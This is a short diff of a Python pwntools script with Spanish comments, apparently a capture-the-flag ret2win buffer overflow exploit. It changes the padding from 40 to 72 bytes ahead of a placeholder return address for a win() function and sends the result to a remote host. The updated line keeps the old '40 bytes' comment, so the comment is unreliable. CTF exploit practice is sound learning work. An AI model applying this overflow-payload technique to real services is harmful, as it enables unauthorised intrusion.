@@ -8,7 +8,7 @@ port = 65534       # Cambia esto por el puerto corrrecto
 p = remote(ip, port)
 
 # Creación del payload
-payload = b'A' * 40  # 40 bytes para llenar el buffer
+payload = b'A' * 72  # 40 bytes para llenar el buffer
 payload += p64(0x00000)  # Dirección de la función win() (esto debe ser la dirección correcta en tu binario)
 
 # Enviar el payload cuando se recibe el mensaje de "Introduce tu mensaje:"
